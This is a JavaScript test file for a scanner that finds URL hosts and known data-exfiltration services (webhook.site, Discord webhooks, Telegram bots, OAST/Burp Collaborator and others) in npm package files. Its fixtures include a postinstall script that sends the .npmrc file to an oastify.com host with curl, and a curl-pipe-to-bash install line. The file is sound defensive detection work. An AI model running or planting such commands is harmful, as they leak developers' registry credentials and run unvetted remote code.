import assert from 'node:assert/strict'
import { test } from 'node:test'
import { npmExfiltration, npmExfiltrationAdded, npmExfiltrationNames, npmExfiltrationSaid, npmHosts } from '../ui/view/file-hosts.js'

const hosts = (path, text) => {
  const found = npmHosts(path, text)
  return found && Object.fromEntries(found)
}
const exfiltration = (path, text) => {
  const found = npmExfiltration(path, text)
  return found && Object.fromEntries(found)
}

test('a script names the hosts of the URLs in its strings, each with the line it is first named on', () => {
  assert.deepEqual(hosts('lib/a.js', 'fetch("https://API.Stripe.com/v1/charges")\nconst ws = \'wss://stream.example.io/feed\'\nfetch(`https://cdn.jsdelivr.net/npm/${name}`)\n'),
    { 'api.stripe.com': 1, 'stream.example.io': 2, 'cdn.jsdelivr.net': 3 }, 'any case, in any quote, a template\'s too')
  assert.deepEqual(hosts('lib/a.js', 'get("http://45.12.3.9:8080/p")\nget("https://user:pw@evil.co/x")\nget("ftp://files.host.net/x")\nget("https://EVIL.co/again")\n'),
    { '45.12.3.9': 1, 'evil.co': 2, 'files.host.net': 3 }, 'an address, a user\'s name and port aside; each host once')
  assert.deepEqual(hosts('bin/cli', '#!/usr/bin/env node\nget("https://registry.example.dev/x")\n'), { 'registry.example.dev': 2 }, 'a script node runs by its hashbang')
  assert.deepEqual(hosts('lib/a.js', 'if (/^https:\\/\\/api\\.evil\\.co\\//.test(url)) send(url)\nif (/^https?:\\/\\/other\\.co/.test(url)) send(url)\n'),
    { 'api.evil.co': 1, 'other.co': 2 }, 'a regular expression\'s, its slashes and dots escaped, its `s` optional')
  assert.deepEqual(hosts('lib/a.js', 'fetch("https:\\/\\/api.evil.com\\/x")\n'), { 'api.evil.com': 1 }, 'a string\'s, its slashes escaped as JSON can write them')
  assert.deepEqual(hosts('lib/a.js', 'get("https://пример.рф/x")\nget("https://api.evil.com.рф/x")\nget("https://xn--e1afmkfd.xn--p1ai/x")\n'),
    { 'пример.рф': 1, 'api.evil.com.рф': 2, 'xn--e1afmkfd.xn--p1ai': 3 }, 'an internationalized name, whole, as written or as punycode')
})

test('a host named in a comment, built as the code runs, local, reserved or a namespace, is none', () => {
  assert.equal(hosts('lib/a.js', '// see https://github.com/org/repo\n/* https://docs.example.dev/api */\nconst a = 1\n'), null, 'comments, as a link to docs')
  assert.equal(hosts('lib/a.js', 'fetch(`https://${host}/x`)\nfetch(`https://api.${domain}/x`)\nfetch("https://" + host)\nfetch(`https://api.service.com.${tld}/x`)\n'), null,
    'built as it runs, whole or its last labels')
  assert.equal(hosts('lib/a.js', ['http://localhost:3000', 'http://127.0.0.1/x', 'http://0.0.0.0', 'https://example.com', 'https://api.example.org/x', 'http://app.test',
    'http://printer.local', 'http://www.w3.org/2000/svg', 'http://a.localhost'].map(url => `get("${url}")`).join('\n')), null, 'local, reserved for examples and tests, or a namespace')
  assert.equal(hosts('lib/a.js', 'get("https://999.1.1.1/x")\nget("https://intranet/x")\n'), null, 'no address, nor a name without a domain')
  assert.equal(hosts('README.md', 'get("https://api.stripe.com")'), null, 'nor any in a file that is no script')
  assert.equal(hosts('data.json', '{"url": "https://api.stripe.com"}'), null)
})

test('a file names the hosts malicious packages send what they take to, wherever written but in prose or a source map', () => {
  const text = ['post("https://webhook.site/0c9a")', 'const h = "eo2xk.m.pipedream.net"', 'send("https://discord.com/api/webhooks/1/x")',
    'curl -fsSL https://bun.sh/install | bash', 'get("https://ipinfo.io/json"); dns("x.oast.fun"); post("https://hooks.slack.com/services/T/B/X")',
    'get("https://pastebin.com/raw/abc")', 'bot("https://api.telegram.org/bot" + token)', '// https://webhook.site/again'].join('\n')
  assert.deepEqual(exfiltration('lib/x.js', text), { 'webhook-site': [1, 8], pipedream: [2], oast: [5], telegram: [7], discord: [3], slack: [5], pastebin: [6], ipinfo: [5], bun: [4] },
    'each with its lines, a comment\'s too')
  assert.deepEqual(exfiltration('setup.sh', 'curl -fsSL https://bun.com/install | bash\n'), { bun: [1] }, 'Bun\'s install script at its new host, in any text')
  assert.deepEqual(exfiltration('package.json', '{"scripts":{"postinstall":"curl -d @.npmrc https://abc.oastify.com"}}'), { oast: [1] }, 'Burp Collaborator\'s')
  assert.deepEqual(exfiltration('lib/y.js', 'get("https://canary.discord.com/api/v10/webhooks/1/x")\nget("https://discordapp.com/api/webhooks/2/y")\n'), { discord: [1, 2] })
  assert.deepEqual(exfiltration('lib/y.js', 'throw new Error("Could not reach webhook.site.")\nconst s = "run curl https://bun.sh/install."\n'), { 'webhook-site': [1], bun: [2] },
    'a sentence ending after it')
  for (const lookalike of ['go("notwebhook.site")', 'go("https://webhook.sites")', 'go("https://discord.com/channels/1")', 'go("https://bun.sh/docs")',
    'go("https://slack.com/api/chat.postMessage")', 'go("https://telegram.org")', 'go("https://bun.sh/installer")',
    'go("https://webhook.site.evil.example/x")', 'go("https://api.telegram.org.attacker.com/bot")', 'go("ipinfo.io.cn")',
    'go("https://bun.sh/install.sh")', 'go("https://discord.com/api/webhooks.json")', 'go("https://hooks.slack.com/services.example")',
    'go("https://webhook.site.рф/x")', 'go("пwebhook.site")']) {
    assert.equal(exfiltration('lib/z.js', lookalike), null, lookalike)
  }
  for (const path of ['README.md', 'docs/exfil.md', 'CHANGELOG', 'dist/a.js.map']) assert.equal(exfiltration(path, text), null, path)
  assert.equal(exfiltration('lib/a.png', null), null)
})

test('the services new to a file, named in their order, each with its lines', () => {
  const was = npmExfiltration('a.js', 'post("https://webhook.site/x")\n')
  const now = npmExfiltration('a.js', 'bot("https://api.telegram.org/bot")\npost("https://webhook.site/x")\n')
  assert.deepEqual(Object.fromEntries(npmExfiltrationAdded(now, was)), { telegram: [1] })
  assert.equal(npmExfiltrationAdded(was, now), null, 'none it named already')
  assert.deepEqual(Object.fromEntries(npmExfiltrationAdded(now, null)), { 'webhook-site': [2], telegram: [1] }, 'all of a file the version compared with didn\'t hold')
  assert.equal(npmExfiltrationNames([now, was]), 'webhook.site, Telegram')
  assert.equal(npmExfiltrationSaid(now, was), 'webhook.site (line 2), Telegram (line 1, new)')
})
